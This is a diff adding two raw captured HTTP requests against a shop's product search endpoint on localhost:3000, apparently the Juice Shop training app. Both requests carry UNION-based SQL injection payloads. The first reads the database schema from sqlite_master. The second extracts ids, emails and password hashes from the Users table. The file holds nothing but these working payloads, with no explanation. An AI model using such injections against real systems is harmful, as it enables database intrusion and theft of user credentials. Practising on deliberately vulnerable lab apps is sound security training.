@@ -1,0 +1,28 @@
+GET /rest/products/search?q=banana'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master-- HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, */*
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://localhost:3000/
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=8JxawrNR4XyQg6n1WE7b5Mpeq8jDdxaGv2mBkVZYLw3Px9lJzKoaOr45lY7P
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+If-None-Match: W/"325f-p28+g3rp8AjZivUIFqbwOnYfZK4"
+
+
+GET /rest/products/search?q=qwert'))%20UNION%SELECT%20id,email,password,'4','5','6','7','8','9'%20FROM%20Users-- HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, */*
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://localhost:3000/
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=8JxawrNR4XyQg6n1WE7b5Mpeq8jDdxaGv2mBkVZYLw3Px9lJzKoaOr45lY7P
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+If-None-Match: W/"325f-p28+g3rp8AjZivUIFqbwOnYfZK4"
